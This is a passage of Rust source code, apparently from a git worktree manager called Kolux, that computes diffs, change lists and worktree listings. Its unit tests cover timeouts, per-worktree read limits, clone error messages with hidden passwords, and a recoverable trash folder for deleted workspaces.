        let mut names: Vec<&str> = text.split('\0').filter(|n| !n.is_empty()).collect();
        names.sort_unstable();
        let capped = names.len() > cap;
        Ok((names.into_iter().take(cap).map(|n| worktree.join(native(n)).to_string_lossy().into_owned()).collect(), capped))
    }

    /// Every file git knows in the worktree, tracked and untracked but not ignored, NUL-separated
    /// and relative to it: Quick Open's list when ripgrep is missing (EDIT-036).
    pub fn listed_files(&self, worktree: &Path) -> Result<String, String> {
        output(&["ls-files", "-z", "--cached", "--others", "--exclude-standard", "--deduplicate"], Some(worktree)).map(|o| String::from_utf8_lossy(&o).into_owned())
    }

    /// The worktree's changed files, staged and unstaged, for the diff picker (EDIT-027).
    pub fn changes(&self, worktree: &Path) -> Result<Vec<Change>, String> {
        let out = output(&["status", "--porcelain=v1", "-z", "--untracked-files=all"], Some(worktree))?;
        Ok(parse_status(&String::from_utf8_lossy(&out), worktree))
    }

    /// The two texts of a file's diff (EDIT-027): unstaged compares the index with the working
    /// file, staged compares HEAD with the index. Git's checkout filters are applied, so line ends
    /// match the working file. A side the file is not on (new, deleted, untracked) is empty.
    pub fn diff_sides(&self, file: &Path, staged: bool) -> Result<(String, String), String> {
        let (old, new) = self.diff_bytes(file, staged)?;
        let text = |b: Vec<u8>| String::from_utf8(b).map_err(|_| format!("{} is not UTF-8 text", file.display()));
        Ok((text(old)?, text(new)?))
    }

    /// The same two sides as bytes, for images in All Changes (EDIT-029).
    pub fn diff_bytes(&self, file: &Path, staged: bool) -> Result<(Vec<u8>, Vec<u8>), String> {
        let dir = file.parent().filter(|d| !d.as_os_str().is_empty()).ok_or_else(|| format!("{} is not a file path", file.display()))?;
        let name = file.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
        // ponytail: any failure to read a side counts as "not there"; tell the two apart if a real error ever hides behind it
        let show = |rev: &str| output(&["cat-file", "--filters", &format!("{rev}:./{name}")], Some(dir)).unwrap_or_default();
        let index = show("");
        if staged {
            return Ok((show("HEAD"), index));
        }
        let work = match std::fs::read(file) {
            Ok(b) => b,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Vec::new(),
            Err(e) => return Err(format!("{}: {e}", file.display())),
        };
        Ok((index, work))
    }

    /// Every change of the worktree with its size and identity, for All Changes (EDIT-029).
    pub fn change_entries(&self, worktree: &Path) -> Result<Vec<Entry>, String> {
        let changes = self.changes(worktree)?;
        let (staged, unstaged) = (diff_stats(worktree, true)?, diff_stats(worktree, false)?);
        Ok(changes
            .into_iter()
            .map(|c| {
                let rel = Path::new(&c.path).strip_prefix(worktree).map(|r| r.to_string_lossy().replace('\\', "/")).unwrap_or_default();
                let disk = std::fs::metadata(&c.path).ok().map(|m| format!("{}-{:?}", m.len(), m.modified().ok())).unwrap_or_default();
                if c.code == '?' {
                    let (lines, binary) = whole_file(&c.path);
                    return Entry { path: c.path, staged: false, code: c.code, lines, binary, stamp: disk };
                }
                let s = (if c.staged { &staged } else { &unstaged }).get(&rel).cloned().unwrap_or_default();
                let stamp = if c.staged { s.ids } else { format!("{}|{disk}", s.ids) };
                Entry { path: c.path, staged: c.staged, code: c.code, lines: s.lines, binary: s.binary, stamp }
            })
            .collect())
    }
}

/// A changed file in All Changes (EDIT-029): `lines` is added plus removed lines (none for a
/// binary file), and `stamp` changes whenever the change does, so a section reuses what it
/// fetched only while its change is the same.
#[derive(Clone, Debug, serde::Serialize)]
pub struct Entry {
    pub path: String,
    pub staged: bool,
    pub code: char,
    pub lines: Option<u64>,
    pub binary: bool,
    pub stamp: String,
}

#[derive(Clone)]
struct Stat {
    lines: Option<u64>,
    binary: bool,
    ids: String,
    code: char,
}

impl Default for Stat {
    fn default() -> Self {
        Stat { lines: None, binary: false, ids: String::new(), code: 'M' }
    }
}

/// `git diff [--cached] --numstat` and `--raw` by path (relative to the top, with forward slashes).
fn diff_stats(worktree: &Path, cached: bool) -> Result<std::collections::HashMap<String, Stat>, String> {
    diff_stats_with(worktree, if cached { &["--cached"] } else { &[] })
}

/// GIT-038 (T-033-c): every file that differs between the commit `since` (the base's snapshot)
/// and the working tree, untracked files included, in the shape All Changes already reads.
pub fn base_entries(worktree: &Path, since: &str) -> Result<Vec<Entry>, String> {
    let stats = diff_stats_with(worktree, &[since, "--"])?;
    let mut rels: Vec<&String> = stats.keys().collect();
    rels.sort();
    let mut out: Vec<Entry> = rels
        .into_iter()
        .map(|rel| {
            let s = &stats[rel];
            let path = worktree.join(native(rel)).to_string_lossy().into_owned();
            let disk = std::fs::metadata(&path).ok().map(|m| format!("{}-{:?}", m.len(), m.modified().ok())).unwrap_or_default();
            Entry { path, staged: false, code: s.code, lines: s.lines, binary: s.binary, stamp: format!("{since}:{}|{disk}", s.ids) }
        })
        .collect();
    let untracked = output(&["ls-files", "--others", "--exclude-standard", "-z"], Some(worktree))?;
    for rel in String::from_utf8_lossy(&untracked).split('\0').filter(|r| !r.is_empty()) {
        let path = worktree.join(native(rel)).to_string_lossy().into_owned();
        let disk = std::fs::metadata(&path).ok().map(|m| format!("{}-{:?}", m.len(), m.modified().ok())).unwrap_or_default();
        let (lines, binary) = whole_file(&path);
        out.push(Entry { path, staged: false, code: '?', lines, binary, stamp: disk });
    }
    Ok(out)
}

/// The two texts of a file against the base snapshot `since`: what the base had, and the working
/// file (empty when the file is new there, or gone here).
pub fn base_sides(file: &Path, since: &str) -> Result<(String, String), String> {
    let dir = file.parent().filter(|d| !d.as_os_str().is_empty()).ok_or_else(|| format!("{} is not a file path", file.display()))?;
    let name = file.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    let old = output(&["cat-file", "--filters", &format!("{since}:./{name}")], Some(dir)).unwrap_or_default();
    let work = match std::fs::read(file) {
        Ok(b) => b,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Vec::new(),
        Err(e) => return Err(format!("{}: {e}", file.display())),
    };
    let text = |b: Vec<u8>| String::from_utf8(b).map_err(|_| format!("{} is not UTF-8 text", file.display()));
    Ok((text(old)?, text(work)?))
}

/// Line count and binary-ness of a file git has no diff for (untracked).
fn whole_file(path: &str) -> (Option<u64>, bool) {
    // ponytail: an untracked file is read whole for its line count; cap the read if huge untracked files get common
    let bytes = std::fs::read(path).unwrap_or_default();
    let binary = bytes.iter().take(8000).any(|&b| b == 0);
    let lines = (!binary).then(|| bytes.iter().filter(|&&b| b == b'\n').count() as u64 + u64::from(bytes.last().is_some_and(|&b| b != b'\n')));
    (lines, binary)
}

/// `git diff <extra> --numstat` and `--raw` by path (relative to the top, with forward slashes).
fn diff_stats_with(worktree: &Path, extra: &[&str]) -> Result<std::collections::HashMap<String, Stat>, String> {
    let mut map: std::collections::HashMap<String, Stat> = std::collections::HashMap::new();
    let with = |args: &[&str]| -> Vec<String> { args.iter().chain(extra.iter()).map(|s| s.to_string()).collect() };
    let args = with(&["diff", "--numstat", "-z", "--no-renames"]);
    let numstat = output(&args.iter().map(String::as_str).collect::<Vec<_>>(), Some(worktree))?;
    for rec in String::from_utf8_lossy(&numstat).split('\0') {
        let mut f = rec.splitn(3, '\t');
        if let (Some(a), Some(r), Some(p)) = (f.next(), f.next(), f.next()) {
            let s = map.entry(p.to_string()).or_default();
            s.binary = a == "-";
            s.lines = a.parse::<u64>().ok().zip(r.parse::<u64>().ok()).map(|(a, r)| a + r);
        }
    }
    let args = with(&["diff", "--raw", "-z", "--no-abbrev", "--no-renames"]);
    let raw = output(&args.iter().map(String::as_str).collect::<Vec<_>>(), Some(worktree))?;
    let text = String::from_utf8_lossy(&raw);
    let mut parts = text.split('\0');
    while let (Some(head), Some(p)) = (parts.next(), parts.next()) {
        let ids: Vec<&str> = head.split(' ').collect();
        if ids.len() >= 4 {
            let s = map.entry(p.to_string()).or_default();
            s.ids = format!("{}-{}", ids[2], ids[3]);
            s.code = ids.get(4).and_then(|c| c.chars().next()).unwrap_or('M');
        }
    }
    Ok(map)
}

/// Parses `git worktree list --porcelain`: blank-line separated blocks, the first is the main
/// checkout. `branch refs/heads/x` is absent for a detached head.
pub fn parse_worktrees(text: &str) -> Vec<Worktree> {
    let mut out = Vec::new();
    for (i, block) in text.split("\n\n").enumerate() {
        let mut path = None;
        let mut head = String::new();
        let mut branch = None;
        let mut locked = None;
        for line in block.lines() {
            let line = line.trim_end_matches('\r');
            if let Some(p) = line.strip_prefix("worktree ") {
                path = Some(native(p));
            } else if let Some(h) = line.strip_prefix("HEAD ") {
                head = h.to_string();
            } else if let Some(b) = line.strip_prefix("branch ") {
                branch = Some(b.strip_prefix("refs/heads/").unwrap_or(b).to_string());
            } else if line == "locked" {
                locked = Some(String::new());
            } else if let Some(r) = line.strip_prefix("locked ") {
                locked = Some(r.to_string());
            }
        }
        if let Some(path) = path {
            out.push(Worktree { path, branch, head, is_main: i == 0, name: None, parent: None, locked, hidden: false, kind: String::new(), source: None, made_by: None, number: None, comment: None });
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn an_unattended_git_fails_fast_on_a_remote_that_wants_a_password() {
        use std::io::{Read, Write};
        // A remote that answers every request with "who are you?" and nothing else.
        let server = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = server.local_addr().unwrap().port();
        std::thread::spawn(move || {
            for mut conn in server.incoming().flatten().take(8) {
                let mut buf = [0u8; 4096];
                let _ = conn.read(&mut buf);
                let _ = conn.write_all(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm=\"private\"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
            }
        });
        // Only NO_PROMPT is under test: a config pair or password helper the parent shell injected
        // (credential.interactive, GIT_ASKPASS) would change git's words, so they are left out.
        ISOLATED.with(|i| i.set(true));
        let url = format!("http://127.0.0.1:{port}/private.git");
        let mut cmd = command(&["-c", "credential.helper=", "ls-remote", &url], None);
        cmd.envs(NO_PROMPT).stdin(std::process::Stdio::null()).stdout(std::process::Stdio::null()).stderr(std::process::Stdio::piped());
        // T-700 (K2): the clock covers git alone, from its start to its exit. A prompt never returns, so the
        // watchdog only has to tell "waiting for an answer" from "slow": a busy CI runner once took git past
        // 30 s to fail as it should. "Terminal prompts disabled" below is the proof that git asked nobody.
        let began = std::time::Instant::now();
        let mut child = cmd.spawn().unwrap();
        while child.try_wait().unwrap().is_none() {
            if began.elapsed() > std::time::Duration::from_secs(90) {
                let _ = child.kill();
                panic!("git still waiting after 90 s, as a password prompt would");
            }
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        let out = child.wait_with_output().unwrap();
        let said = String::from_utf8_lossy(&out.stderr).to_lowercase();
        assert!(!out.status.success());
        assert!(said.contains("terminal prompts disabled"), "{said}");
    }

    #[test]
    fn git038_base_entries_list_every_difference_from_the_snapshot_and_the_sides_read_against_it() {
        let dir = temp_repo("base");
        run(&["config", "core.autocrlf", "false"], Some(&dir)).unwrap();
        fs::write(dir.join("a.txt"), "one\ntwo\n").unwrap();
        run(&["add", "."], Some(&dir)).unwrap();
        run(&["commit", "-q", "-m", "a"], Some(&dir)).unwrap();
        let since = run(&["rev-parse", "HEAD"], Some(&dir)).unwrap().trim().to_string();
        // A committed change, a working-tree change, a new untracked file, a deletion.
        fs::write(dir.join("a.txt"), "one\ntwo\nthree\n").unwrap();
        run(&["commit", "-q", "-am", "a again"], Some(&dir)).unwrap();
        fs::write(dir.join("README.md"), "hello\nworld\n").unwrap();
        fs::write(dir.join("new.txt"), "fresh").unwrap();
        let entries = base_entries(&dir, &since).unwrap();
        let rel = |e: &Entry| Path::new(&e.path).strip_prefix(&dir).unwrap().to_string_lossy().replace('\\', "/");
        let got: Vec<(String, char, Option<u64>, bool)> = entries.iter().map(|e| (rel(e), e.code, e.lines, e.staged)).collect();
        assert_eq!(got, vec![("README.md".to_string(), 'M', Some(1), false), ("a.txt".to_string(), 'M', Some(1), false), ("new.txt".to_string(), '?', Some(1), false)]);
        assert!(entries[0].stamp.starts_with(&format!("{since}:")), "{}", entries[0].stamp);
        assert_eq!(base_sides(&dir.join("README.md"), &since).unwrap(), ("hello\n".to_string(), "hello\nworld\n".to_string()));
        assert_eq!(base_sides(&dir.join("new.txt"), &since).unwrap(), (String::new(), "fresh".to_string()));
        fs::remove_file(dir.join("a.txt")).unwrap();
        let entries = base_entries(&dir, &since).unwrap();
        assert_eq!(entries.iter().map(|e| (rel(e), e.code)).collect::<Vec<_>>(), vec![("README.md".to_string(), 'M'), ("a.txt".to_string(), 'D'), ("new.txt".to_string(), '?')]);
        assert_eq!(base_sides(&dir.join("a.txt"), &since).unwrap(), ("one\ntwo\n".to_string(), String::new()));
        let _ = fs::remove_dir_all(&dir);
    }

    fn temp_repo(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("kolux-rs-git-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        run(&["init", "-q", "-b", "main"], Some(&dir)).unwrap();
        run(&["config", "user.email", "test@example.com"], Some(&dir)).unwrap();
        run(&["config", "user.name", "Kolux test"], Some(&dir)).unwrap();
        fs::write(dir.join("README.md"), "hello\n").unwrap();
        run(&["add", "."], Some(&dir)).unwrap();
        run(&["commit", "-q", "-m", "first"], Some(&dir)).unwrap();
        dir
    }

    #[test]
    fn cli018_only_commands_that_change_the_worktree_list_count_as_a_change() {
        let counts = |args: &[&str]| WorktreeChange::watch(args).0;
        for args in [&["worktree", "add", "-b", "x", "d", "main"][..], &["-c", "gc.auto=0", "worktree", "remove", "d"], &["worktree", "move", "a", "b"], &["worktree", "prune"], &["worktree", "repair"], &["-C", "worktree", "worktree", "add", "d"]] {
            assert!(counts(args), "{args:?}");
        }
        for args in [&["worktree", "list", "--porcelain"][..], &["status"], &["branch", "-D", "worktree"], &["worktree"], &[], &["commit", "-m", "worktree", "add"], &["-C", "worktree", "status"]] {
            assert!(!counts(args), "{args:?}");
        }
    }

    #[test]
    fn cli018_adding_then_removing_a_worktree_counts_as_two_changes() {
        let git = Git::detect().unwrap();
        let repo = temp_repo("wt-count");
        let dest = std::env::temp_dir().join(format!("kolux-rs-git-wt-count-ws-{}", std::process::id())).join("c");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        let mine = || THIS_THREAD_CHANGES.with(|c| c.get());
        let before = mine();
        git.worktree_add(&repo, &dest, "c", "HEAD").unwrap();
        assert_eq!(mine() - before, 1, "add");
        git.worktree_remove(&repo, &dest, Some("c")).unwrap();
        assert_eq!(mine() - before, 2, "remove, whose normal path runs no git worktree command");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
    }

    #[test]
    fn git070_only_short_reads_take_a_turn_and_long_running_commands_are_exempt() {
        for args in [&["status", "--porcelain=v2"][..], &["-c", "core.quotepath=off", "diff", "--numstat"], &["-C", "x", "log", "-1"], &["rev-parse", "HEAD"], &["worktree", "list", "--porcelain"], &["for-each-ref"]] {
            assert!(short_read(args), "{args:?}");
        }
        for args in [&["worktree", "add", "-b", "x", "d", "main"][..], &["fetch", "origin"], &["clone", "u", "d"], &["push", "-u", "origin", "x"], &["pull"], &["commit", "-m", "x"], &["-c", "alias.x=!sleep 1", "x"], &["--version"], &["worktree", "remove", "d"], &[]] {
            assert!(!short_read(args), "{args:?}");
        }
    }

    #[test]
    fn git070_turns_are_per_worktree_and_exempt_commands_never_wait() {
        ISOLATED.with(|i| i.set(true));
        let (a, b) = (temp_repo("git070-a"), temp_repo("git070-b"));
        static L: Limiter = Limiter::new(1);
        let held = L.enter(&a, false);
        // A short read on the busy worktree waits for its turn...
        let (tx, rx) = std::sync::mpsc::channel();
        let a2 = a.clone();
        let waiter = std::thread::spawn(move || {
            ISOLATED.with(|i| i.set(true));
            let _ = tx.send(gated(&["rev-parse", "HEAD"], Some(&a2), &L, SHORT_READ_LIMIT));
        });
        assert!(rx.recv_timeout(std::time::Duration::from_millis(400)).is_err(), "a short read waited for the worktree's turn");
        // ...while another worktree's short read does not (no app-wide cap)...
        assert!(gated(&["rev-parse", "HEAD"], Some(&b), &L, SHORT_READ_LIMIT).is_ok());
        // ...and fetch and worktree add on the busy worktree run at once, with no turn taken.
        assert!(gated(&["fetch", "-q", "."], Some(&a), &L, SHORT_READ_LIMIT).is_ok());
        let wt = a.with_file_name(format!("{}-wt", a.file_name().unwrap().to_string_lossy()));
        let _ = fs::remove_dir_all(&wt);
        assert!(gated(&["worktree", "add", "-q", "-b", "side", &wt.to_string_lossy(), "main"], Some(&a), &L, SHORT_READ_LIMIT).is_ok());
        assert_eq!(L.running(&a), 1, "only the held turn is counted");
        drop(held);
        assert!(rx.recv_timeout(std::time::Duration::from_secs(30)).unwrap().is_ok(), "the waiting read ran once the turn was free");
        waiter.join().unwrap();
        assert_eq!(L.running(&a), 0);
        for d in [&wt, &a, &b] {
            let _ = fs::remove_dir_all(d);
        }
    }

    #[test]
    fn git070_waiting_foreground_reads_go_before_waiting_background_reads_on_one_worktree() {
        static L: Limiter = Limiter::new(1);
        let dir = Path::new("git070-order");
        let order = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
        let held = L.enter(dir, false);
        let wait = |fg: bool, name: &'static str| {
            let order = order.clone();
            std::thread::spawn(move || {
                let _t = L.enter(dir, fg);
                order.lock().unwrap().push(name);
            })
        };
        let bg = wait(false, "background");
        std::thread::sleep(std::time::Duration::from_millis(150));
        let fg = wait(true, "foreground");
        std::thread::sleep(std::time::Duration::from_millis(150));
        drop(held);
        bg.join().unwrap();
        fg.join().unwrap();
        assert_eq!(*order.lock().unwrap(), ["foreground", "background"]);
        assert_eq!(L.running(dir), 0);
    }

    #[test]
    fn git070_a_hung_short_read_is_stopped_at_its_limit_and_the_next_read_runs() {
        ISOLATED.with(|i| i.set(true));
        let dir = temp_repo("git070-hang");
        fs::write(dir.join("README.md"), "changed\n").unwrap();
        static L: Limiter = Limiter::new(4);
        let started = std::time::Instant::now();
        // diff hands each changed file to an external tool that never ends.
        let err = gated(&["-c", "diff.external=sleep 20;:", "diff", "--ext-diff"], Some(&dir), &L, std::time::Duration::from_millis(600)).unwrap_err();
        assert!(started.elapsed() < std::time::Duration::from_secs(10), "stopped at the limit: {:?}", started.elapsed());
        assert!(err.contains("did not finish"), "{err}");
        assert_eq!(L.running(&dir), 0, "the turn is given back");
        assert!(gated(&["diff", "--name-only"], Some(&dir), &L, SHORT_READ_LIMIT).unwrap().starts_with(b"README.md"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[cfg(windows)]
    #[test]
    fn git070_long_windows_paths_are_switched_on_without_changing_the_command_line() {
        let cmd = command(&["status"], None);
        let env: Vec<_> = cmd.get_envs().filter_map(|(k, v)| Some((k.to_string_lossy().into_owned(), v?.to_string_lossy().into_owned()))).collect();
        // T-779: the slot number follows the user's own pairs (and core.fsmonitor takes the first of
        // ours), so what matters is a key slot naming core.longpaths with "true" in the same slot.
        let slot = env.iter().find(|(k, v)| k.starts_with("GIT_CONFIG_KEY_") && v == "core.longpaths").map(|(k, _)| k["GIT_CONFIG_KEY_".len()..].to_string());
        let slot = slot.unwrap_or_else(|| panic!("no core.longpaths slot: {env:?}"));
        assert!(env.contains(&(format!("GIT_CONFIG_VALUE_{slot}"), "true".into())), "{env:?}");
        let count: usize = env.iter().find(|(k, _)| k == "GIT_CONFIG_COUNT").map(|(_, v)| v.parse().unwrap()).unwrap();
        assert!(slot.parse::<usize>().unwrap() < count, "the slot is inside the count: {env:?}");
        assert_eq!(cmd.get_args().collect::<Vec<_>>(), ["status"]);
    }

    #[test]
    fn proj027_the_add_wait_defaults_to_three_minutes_and_the_override_is_clamped() {
        let min = std::time::Duration::from_secs(180);
        assert_eq!(add_timeout(None), min);
        assert_eq!(add_timeout(Some("nonsense")), min);
        assert_eq!(add_timeout(Some("1000")), min, "below the floor");
        assert_eq!(add_timeout(Some("600000")), std::time::Duration::from_secs(600));
        assert_eq!(add_timeout(Some(" 600000 ")), std::time::Duration::from_secs(600));
        assert_eq!(add_timeout(Some("99999999")), std::time::Duration::from_secs(1800), "above the ceiling");
    }

    #[test]
    fn proj027_a_git_that_stalls_is_stopped_with_a_message_naming_the_wait_and_the_cause() {
        ISOLATED.with(|i| i.set(true));
        let dir = temp_repo("proj027-stall");
        let started = std::time::Instant::now();
        let err = run_within(&["-c", "alias.stall=!sleep 20", "stall"], Some(&dir), std::time::Duration::from_millis(400)).unwrap_err();
        assert!(started.elapsed() < std::time::Duration::from_secs(10), "stopped at the limit, not at the end of the stall");
        assert!(err.contains("did not finish") && err.contains("cloud service"), "{err}");
        // A quick git still answers, with output trimmed; a failing one carries its stderr.
        assert_eq!(run_within(&["rev-parse", "--abbrev-ref", "HEAD"], Some(&dir), std::time::Duration::from_secs(30)).unwrap(), "main");
        assert!(run_within(&["rev-parse", "--verify", "nope"], Some(&dir), std::time::Duration::from_secs(30)).is_err());
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn t315_a_failed_clone_comes_down_to_its_last_fatal_line_without_progress() {
        // A real clone into a folder that exists and is not empty.
        ISOLATED.with(|i| i.set(true));
        let src = temp_repo("t315-src");
        let dest = std::env::temp_dir().join(format!("kolux-rs-git-t315-dest-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dest);
        fs::create_dir_all(&dest).unwrap();
        fs::write(dest.join("keep.txt"), "mine\n").unwrap();
        let out = command(&["clone", "--progress", "--", &native(&src.to_string_lossy()), &native(&dest.to_string_lossy())], None).output().unwrap();
        assert!(!out.status.success());
        let reason = failure_reason(&String::from_utf8_lossy(&out.stderr)).unwrap();
        assert!(reason.starts_with("Destination path") && reason.contains("already exists"), "{reason}");
        // A clone that fails part-way: progress (with \r redraws) and trailing fragments never show.
        let log = "Cloning into 'x'...\nremote: Enumerating objects: 5, done.\nReceiving objects:  10% (1/9)\rReceiving objects:  40% (4/9)\nerror: RPC failed; curl 56 recv failure\nfatal: early EOF\nfatal: fetch-pack: invalid index-pack output\nremote: \n";
        assert_eq!(failure_reason(log).as_deref(), Some("Fetch-pack: invalid index-pack output"));
        assert_eq!(failure_reason("error: cannot lock ref\nReceiving objects: 100%").as_deref(), Some("Cannot lock ref"));
        assert_eq!(failure_reason("warning: could not find UI helper\n").as_deref(), Some("Warning: could not find UI helper"));
        assert_eq!(failure_reason("Cloning into 'x'...\nReceiving objects:  3%\r"), None);
        let _ = fs::remove_dir_all(&src);
        let _ = fs::remove_dir_all(&dest);
    }

    /// FIX-2 AFTER 3: the reason never shows a password or token that was in the link, and a
    /// line git ended with a bare \r still counts.
    #[test]
    fn fix2_a_clone_reason_hides_the_link_password_and_keeps_a_last_redrawn_line() {
        let log = "Cloning into 'x'...\nfatal: unable to access 'https://me:ghp_secret123@github.com/o/r.git/': The requested URL returned error: 403\n";
        let reason = failure_reason(log).unwrap();
        assert!(!reason.contains("ghp_secret123") && !reason.contains("me:"), "{reason}");
        assert!(reason.contains("https://***@github.com/o/r.git/"), "{reason}");
        assert_eq!(failure_reason("Receiving objects:  3%\rfatal: repository not found\r").as_deref(), Some("Repository not found"));
        assert_eq!(failure_reason("fatal: gone\r\n").as_deref(), Some("Gone"));
    }

    #[test]
    fn merge_predictions_need_git_2_38() {
        let g = |v: &str| Git { version: v.into() }.predicts_merges();
        assert!(!g("git version 2.37.1") && !g("git version 1.9.5.msysgit.1"));
        assert!(g("git version 2.38.0") && g("git version 2.55.0.windows.3") && g("git version 3.0.0"));
        // A version that cannot be read is tried; merge-tree itself then says whether it can.
        assert!(g("something else"));
    }

    #[test]
    fn detects_git_and_rejects_plain_folders() {
        let git = Git::detect().unwrap();
        assert!(git.version.starts_with("git version"));
        let plain = std::env::temp_dir().join(format!("kolux-rs-plain-{}", std::process::id()));
        fs::create_dir_all(&plain).unwrap();
        let err = git.toplevel(&plain).unwrap_err();
        assert!(err.contains("not inside a Git repository"), "{err}");
        assert!(git.toplevel(&plain.join("missing")).unwrap_err().contains("not a folder"));
        fs::remove_dir_all(&plain).unwrap();
    }

    #[test]
    fn worktree_add_then_remove_round_trip() {
        let git = Git::detect().unwrap();
        let repo = temp_repo("wt");
        fs::create_dir_all(repo.join("src")).unwrap();
        let top = git.toplevel(&repo.join("src")).unwrap();
        assert_eq!(top.canonicalize().unwrap(), repo.canonicalize().unwrap(), "a subfolder resolves to the repository root");
        assert_eq!(git.toplevel(&repo.join(".git")).unwrap().canonicalize().unwrap(), repo.canonicalize().unwrap(), "the .git folder itself means the repository");

        let before = git.worktrees(&repo).unwrap();
        assert_eq!(before.len(), 1);
        assert!(before[0].is_main);
        assert_eq!(before[0].branch.as_deref(), Some("main"));

        let dest = std::env::temp_dir().join(format!("kolux-rs-git-wt-ws-{}", std::process::id())).join("fix-login");
        let _ = fs::remove_dir_all(dest.parent().unwrap());
        git.worktree_add(&repo, &dest, "fix-login", "HEAD").unwrap();
        assert!(dest.join("README.md").is_file(), "worktree folder has the files");
        assert!(git.branch_taken(&repo, "fix-login"));
        let list = git.worktrees(&repo).unwrap();
        assert_eq!(list.len(), 2);
        let added = list.iter().find(|w| !w.is_main).unwrap();
        assert_eq!(added.branch.as_deref(), Some("fix-login"));
        assert_eq!(PathBuf::from(&added.path).canonicalize().unwrap(), dest.canonicalize().unwrap());

        assert_eq!(git.worktree_remove(&repo, &dest, Some("fix-login")).unwrap(), None);
        assert!(!dest.exists(), "folder is gone");
        assert!(!git.branch_taken(&repo, "fix-login"), "branch is gone");
        assert_eq!(git.worktrees(&repo).unwrap().len(), 1);

        fs::remove_dir_all(dest.parent().unwrap()).unwrap();
        fs::remove_dir_all(&repo).unwrap();
    }

    #[test]
    fn proj074_a_deleted_workspace_goes_through_a_hidden_trash_and_can_be_moved_back() {
        let base = std::env::temp_dir().join(format!("kolux-rs-git-trash-{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        let dest = base.join("big");
        fs::create_dir_all(dest.join("deep/er")).unwrap();
        fs::write(dest.join("deep/er/f.txt"), "x").unwrap();
        let trash = move_to_trash(&dest).unwrap();
        assert!(!dest.exists(), "the folder is gone from its place at once");
        let name = trash.file_name().unwrap().to_string_lossy().into_owned();
        assert!(trash.join("deep/er/f.txt").is_file() && trash.parent() == Some(base.as_path()) && is_trash_name(&name) && name.ends_with("-big"), "{name}");
        // the removal is undone: the folder goes back to where Git expects it
        move_back(&trash, &dest).unwrap();
        assert!(dest.join("deep/er/f.txt").is_file() && !trash.exists());
        // and the second time it is deleted off the caller's thread
        let trash = move_to_trash(&dest).unwrap();
        assert!(spawn_empty_trash(trash.clone()).join().unwrap());
        assert!(!trash.exists() && !dest.exists());
        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn row128_a_trash_folder_whose_move_back_failed_is_kept_by_the_launch_sweep() {
        let base = std::env::temp_dir().join(format!("kolux-rs-git-r128-{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        let dest = base.join("work");
        fs::create_dir_all(&dest).unwrap();
        fs::write(dest.join("notes.txt"), "work the user still needs").unwrap();
        let trash = move_to_trash(&dest).unwrap();
        // something took the folder's place meanwhile, so moving it back fails
        fs::create_dir_all(dest.join("other")).unwrap();
        let err = move_back(&trash, &dest).unwrap_err();
        let _ = sweep_trash(&base);
        assert!(trash.join("notes.txt").is_file(), "the launch sweep must never delete a folder whose move back failed");
        assert!(err.contains(&trash.display().to_string()), "the error says where the folder is kept: {err}");
        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn proj074_the_sweep_clears_confirmed_trash_of_the_exact_shape_and_nothing_else() {
        let base = std::env::temp_dir().join(format!("kolux-rs-git-sweep-{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        // row 130: only `.kolux-trash-<hex>-<hex>-<name>` counts; the old forms are left alone
        for dir in [".kolux-trash-1a-2b-otter", ".kolux-trash-1a-2c-work", ".kolux-trash-otter", "otter.kolux-trash", ".kolux-trash-zz-2b-otter", ".kolux-trash-1a-2b-", "otter", ".kolux-trash-", ".git", "trash", "keep.kolux-trash-x"] {
            fs::create_dir_all(base.join(dir)).unwrap();
            fs::write(base.join(dir).join("f.txt"), "x").unwrap();
        }
        confirm_trash(&base.join(".kolux-trash-1a-2b-otter"));
        fs::write(base.join(".kolux-trash-1a-2b-file"), "a file with a trash name is not a folder").unwrap();
        let swept = sweep_trash(&base);
        let names = |v: &[PathBuf]| v.iter().map(|p| p.file_name().unwrap().to_string_lossy().into_owned()).collect::<Vec<_>>();
        assert_eq!(names(&swept.gone), vec![".kolux-trash-1a-2b-otter"]);
        // row 128: a trash folder whose removal was never confirmed is kept and reported
        assert_eq!(names(&swept.kept), vec![".kolux-trash-1a-2c-work"]);
        for kept in [".kolux-trash-1a-2c-work", ".kolux-trash-otter", "otter.kolux-trash", ".kolux-trash-zz-2b-otter", ".kolux-trash-1a-2b-", "otter", ".kolux-trash-", ".git", "trash", "keep.kolux-trash-x", ".kolux-trash-1a-2b-file"] {
            assert!(base.join(kept).exists(), "{kept} must stay");
        }
        assert!(sweep_trash(&base.join("no-such-folder")).gone.is_empty());
        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn row128_a_confirmed_delete_cut_short_keeps_its_mark_until_the_last_file_goes() {
        let base = std::env::temp_dir().join(format!("kolux-rs-git-r128c-{}", std::process::id()));
        let _ = fs::remove_dir_all(&base);
        let trash = base.join(".kolux-trash-1-2-big");
        fs::create_dir_all(trash.join("deep")).unwrap();
        fs::write(trash.join("deep/f.txt"), "x").unwrap();
        confirm_trash(&trash);
        assert!(clear_confirmed_last(&trash) && !trash.exists());
        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn row127_undoing_a_removal_puts_back_the_folder_and_gits_record_whole() {
        let git = Git::detect().unwrap();
        let repo = temp_repo("r127");
        let dest = std::env::temp_dir().join(format!("kolux-rs-git-r127-ws-{}", std::process::id())).join("undo-me");
